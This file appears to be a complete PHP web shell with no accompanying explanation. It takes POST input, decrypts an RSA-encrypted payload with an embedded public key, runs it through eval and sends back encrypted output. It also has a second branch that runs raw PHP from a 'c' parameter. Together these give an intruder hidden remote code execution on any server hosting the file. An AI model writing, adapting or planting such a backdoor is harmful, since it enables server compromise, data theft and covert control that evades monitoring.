<?php
$r="-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq6RHhCFeLBWe7n7UgkCF\n/EIFpQPp818gnLm/CVvH0By7wuvlbu80mDhqfJyPHK0XgT/Tc9e1Fv7IGU2fFjgb\nPXYF85n0wBcGUY+jR4GEufo/ONsOawLxX213AnO7hJrFRmS+IQoh2fMi655cn1yY\nJ03Hp8xpZ2gSUQVsyIjwu6Cpc3sOmmr8jQUJQJER7CUPeIfZD7fd0jTJAiU8xdDO\nGKpqhpzIb0QNX57jVtOTAlJfOcFOZ488LAqVk6QXe3Sq8R2MorUpX5l6P9Yygl4U\nCLpnPT6rqrJe6Rg3Is4McZh9RMG/qDkdd8YA1HJQpyxprMMcleDcqmjxMb4TRL3e\nlQIDAQAB\n-----END PUBLIC KEY-----";
$k=openssl_pkey_get_public($r);
parse_str(@file_get_contents("php://input"),$_);
if(isset($_POST['d'])){
    $c='';
    foreach(str_split(base64_decode($_POST['d']),256) as $chunk){openssl_public_decrypt($chunk,$dec,$k);$c.=$dec;}
    ob_start();eval($c);$o=ob_get_clean();
    $out='';
    foreach(str_split($o,245) as $chunk){openssl_public_encrypt($chunk,$enc,$k);$out.=$enc;}
    echo base64_encode($out);
}elseif(isset($_POST['c'])){
    eval($_POST['c']);
}
